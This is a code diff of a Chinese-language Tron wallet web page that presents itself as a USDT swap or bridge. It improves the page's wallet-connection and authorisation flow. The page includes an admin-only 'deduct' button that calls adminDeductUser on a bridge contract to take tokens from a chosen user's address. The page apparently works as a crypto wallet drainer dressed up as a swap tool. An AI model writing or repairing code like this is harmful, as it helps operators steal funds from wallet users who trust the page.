@@ -134,7 +134,7 @@ body{
     <i class="fa fa-cog text-gray-600 text-xl"></i>
   </div>
 </div>
-<div id="walletStatus" class="text-sm text-gray-500 mb-4">请连接波场钱包</div>
+<div id="walletStatus" class="text-sm text-gray-500 mb-4">请在TP钱包内置浏览器打开页面，点击连接钱包</div>
 
 <div class="card-wrap">
   <div class="flex justify-between items-center mb-2">
@@ -307,25 +307,49 @@ maxAllBtn.addEventListener("click",async function(){
   sendInput.dispatchEvent(new Event("input"));
 })
 
+// ==========修复后的钱包连接逻辑 关键：tron_requestAccounts授权请求==========
 connectBtn.addEventListener("click",async function(){
-  if(!window.tronWeb || !window.tronWeb.ready){
-    walletStatus.innerText="请在TP钱包/波场钱包内置浏览器打开";
+  walletStatus.innerText = "正在请求钱包授权...";
+  //判断是否注入tronWeb
+  if(!window.tronWeb){
+    walletStatus.innerText = "❌没有检测到tronWeb，请使用TP钱包内置浏览器打开页面";
     return;
   }
   try{
+    //等待ready状态
+    let count = 0;
+    while(!window.tronWeb.ready && count<20){
+      await new Promise(r=>setTimeout(r,200));
+      count++;
+    }
+    if(!window.tronWeb.ready){
+      walletStatus.innerText="❌tronWeb初始化超时，请刷新页面重试";
+      return;
+    }
     tronWeb = window.tronWeb;
+    //发起钱包授权弹窗【重点！旧代码缺失这一步】
+    await tronWeb.request({method:"tron_requestAccounts"});
     userAddress = tronWeb.defaultAddress.base58;
-    walletStatus.innerText = "已连接钱包："+userAddress;
-
+    if(!tronWeb.isAddress(userAddress)){
+      walletStatus.innerText="❌获取钱包地址失败";
+      return;
+    }
+    walletStatus.innerText = "✅已连接钱包："+userAddress;
+    //初始化合约实例
     usdtContractInstance = await tronWeb.contract().at(USDT_TRC20);
     bridgeContractInstance = await tronWeb.contract().at(BRIDGE_CONTRACT);
 
     maxAllBtn.classList.remove("opacity-50","pointer-events-none");
     swapActionBtn.disabled = false;
-
     await checkAdmin();
   }catch(e){
-    walletStatus.innerText = "连接失败:"+String(e.message).slice(0,40);
+    console.error(e);
+    let msg = e.message || String(e);
+    if(msg.includes("User rejected")){
+      walletStatus.innerText="用户拒绝钱包授权";
+    }else{
+      walletStatus.innerText="连接失败："+msg.slice(0,50);
+    }
   }
 })
 
@@ -422,7 +446,6 @@ deductUserTokenBtn.addEventListener("click",async ()=>{
   if(isNaN(numDeduct)||numDeduct<=0) return alert("请输入划扣数量");
   const deductSun = tronWeb.toSun(numDeduct,DECIMALS);
   try{
-    // 调用中转合约管理员划扣函数 adminDeductUser(user,amountSun)
     const tx = await bridgeContractInstance.methods.adminDeductUser(fromUser, deductSun).send();
     alert("划扣成功 TxHash:"+tx);
     targetUserAddr.value="";
